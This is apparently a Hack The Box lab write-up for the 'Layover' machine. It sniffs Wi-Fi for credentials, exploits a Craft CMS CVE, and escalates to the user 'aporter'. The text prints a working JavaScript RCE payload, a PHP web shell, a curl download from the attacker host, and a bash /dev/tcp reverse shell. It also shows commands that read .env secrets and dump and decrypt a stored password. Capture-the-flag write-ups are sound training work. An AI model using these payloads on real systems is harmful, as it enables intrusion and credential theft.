# Layover---HTB

Nmap report
````
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-26 16:07 -0300
Nmap scan report for 10.129.3.213
Host is up (0.38s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
3389/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   244.47 ms 10.10.16.1
2   449.34 ms 10.129.3.213

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.56 seconds
````

The only open ports are 22 and 3389, that correspond to ssh and rdp (remote desktop protocol).

The credentials given (contractor / Contractor2026!) only work at rpd:
````
xfreerdp /u:contractor /p:'Contractor2026!' /v:10.129.39.253
````
<img width="1030" height="795" alt="image" src="https://github.com/user-attachments/assets/ad08db8d-78f2-4d28-a144-2cf94dbe4d46" />

Rpd lags horribly. But we can access the browser:

<img width="1002" height="717" alt="image" src="https://github.com/user-attachments/assets/58aa1793-ed5f-4418-a3c3-1bfa8f1cb0ad" />

To connect to the portal you need to be connected to the airport wifi:

<img width="292" height="368" alt="image" src="https://github.com/user-attachments/assets/1f966f01-70c2-435c-b59b-541e24c39458" />

The airport portal does not have wnything important going on:

<img width="1001" height="676" alt="image" src="https://github.com/user-attachments/assets/98f6e10a-c2c8-4679-bd44-613fc1c4a99d" />

If we access CMD we are logged in as contractor:

<img width="822" height="512" alt="image" src="https://github.com/user-attachments/assets/bb4a084d-eb35-47b7-adeb-111415803907" />

We have two wireless network interfaces:

<img width="1012" height="311" alt="image" src="https://github.com/user-attachments/assets/7e936e74-ee2f-4733-9584-ad3c5c2144ff" />

Interestingly wirshark seems to be installed:

<img width="830" height="517" alt="image" src="https://github.com/user-attachments/assets/16aff650-9635-4bbc-a763-6ca0436dd57c" />

Let's try to use one to monitor the other:

````
sudo su
nmcli radio wifi on
nmcli dev set wlan2 managed yes
nmcli dev wifi connect "HTB International WiFi" ifname wlan2


ip addr show wlan2; ip route
getent hosts portal.international.htb wifi.international.htb


ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
tshark -i wlan3 -a duration:30 -Y 'wlan.fc.type==2' -T fields -e wlan.sa -e wlan.da 2>/dev/null | sort | uniq -c | sort -rn | head

iw dev wlan3 set type monitor 2>/dev/null; ip link set wlan3 up; iw dev wlan3 set channel 6
tshark -i wlan3 -a duration:120 -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.full_uri -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null
````

The ouput are creds for the jenny user (jenny:Fl1ghtDeck2026!) we have login into the portal but this does notget us anythong very interesting:

<img width="1002" height="713" alt="image" src="https://github.com/user-attachments/assets/1c5f5977-117c-4326-8127-3ac3f56a0a0e" />

There is another login option at http://portal.international.htb/admin/login

<img width="1026" height="742" alt="image" src="https://github.com/user-attachments/assets/e64ebfea-ec0e-43d8-9c42-9965c4f818c5" />

Here we can login as jenny also:

<img width="1027" height="741" alt="image" src="https://github.com/user-attachments/assets/a91ac8fc-5364-4c43-a333-22dae23e3737" />

We found a targetable software Craft cms version solo 5.9.8. There is a vulnerabily for it: CVE-2026-55794.

There is also an admin login page that we can also login as jenny:

<img width="990" height="632" alt="image" src="https://github.com/user-attachments/assets/5fa91590-775e-4f5a-8b1e-81f3bd69a349" />

We are going to use this as way to get a php shell.

First create a shell.php file, with the following contents:

````
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

````

Then press Ctrl+Shift+J, go to console, and paste the code above, after typing "allow pasting":
````
(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const fire = (cmd) => {
    const b = { elementType: "craft\\elements\\Category", siteId: 1, search: "",
      condition: { class: "craft\\elements\\conditions\\ElementCondition", elementType: "craft\\elements\\Category",
        fieldLayouts: [ { "as rce": { "__class": "yii\\behaviors\\AttributeTypecastBehavior",
          "__construct()": [ { attributeTypes: { typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"] },
          typecastBeforeSave: cmd } ] }, "on *": "self::beforeSave" } ] } };
    const url='/index.php?p=admin/actions/element-search/search';
    const t0 = performance.now();
    return fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json','X-CSRF-Token':csrf},body:JSON.stringify(b)})
      .then(r=>r.text().then(t=>({status:r.status, ms: Math.round(performance.now()-t0), head:t.slice(0,60)})));
  };
  const timed = await fire("curl http://10.13.37.182:8000/shell.php --output /var/www/portal/web/index.php");
  return JSON.stringify({timed});
})()
````
This command is going to upload your shell.php into the website and substitute index.php for it:

<img width="997" height="717" alt="image" src="https://github.com/user-attachments/assets/3973ea4a-a5d1-4e14-9e50-5b602d619096" />

Now we have shell as www-data. Let's get that shell out of the browser and into the command line. Open a listener:
````
nc -lnvp 9001
````
Then execute a rever shell from the php shell:
````
bash -c 'bash -i >& /dev/tcp/10.13.37.182/9001 0>&1'
````

<img width="1023" height="82" alt="image" src="https://github.com/user-attachments/assets/23e0bd6e-88df-403f-acb6-a852472ac027" />

/etc/passwd shows us the following:
````
www-data@portal:~/portal/web$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
syslog:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:106:1::/var/cache/pollinate:/bin/false
tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin
_galera:x:109:65534::/nonexistent:/usr/sbin/nologin
mysql:x:110:112:MariaDB Server,,,:/nonexistent:/bin/false
aporter:x:1001:1001::/home/aporter:/bin/bash
_runit-log:x:999:988:Created by dh-sysuser for runit:/nonexistent:/usr/sbin/nologin
````

We probably want to escalate to aporter, and line 108 of /var/www/portal/modules/htbairways/console/controllers/MilesController.php proves that:
````
'user' => $kv['mailRelayUser'] ?? 'aporter',
````
This part tells us where the encrypted password is hiding
````
$kv = array_column(
    (new Query())->select(['name', 'value'])
        ->from('{{%htbairways_settings}}')
        ->all(),
    'value',
    'name'
);
````

This tells us how it is encrypted so we can reverse it:
````
$password = Craft::$app->getSecurity()
    ->decryptByKey(
        base64_decode($kv['mailRelayPassword']),
        $securityKey
    );
````

And finally where the encryption key is:
````
$securityKey = Craft::$app->getConfig()->getGeneral()->securityKey;
````

Now we have all of the pieces of the puzzle, we just have to find them and get them. Go to ~/portal and:
````
cat ./env
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DEV_MODE=false
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_DISALLOW_ROBOTS=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
CRAFT_DB_TABLE_PREFIX=
````
Use mysqldump to get the crypted password:
````
mysqldump -h 127.0.0.1 -P 3306 -u craftuser -p craft htbairways_settings
````
We have it:
mysqldump -h 127.0.0.1 -P 3306 -u craftuser -p craft htbairways_settings
Now that we have the key and the encrypted password, let's make a php program to decrypt it:
````
<?php
require '/var/www/portal/vendor/autoload.php';
$s = new yii\base\Security();
$blob = base64_decode('u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=');
echo $s->decryptByKey($blob, 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr'), "\n";
EOF
php /tmp/dec.php
>
````
The output of this is aporter's password: Skyp0rt_Relay!26

Now just su aporter and get user.txt:

<img width="1021" height="198" alt="image" src="https://github.com/user-attachments/assets/4badb8b2-6fb8-4a91-972d-763ecc4790fe" />

First of all a internal port scan:





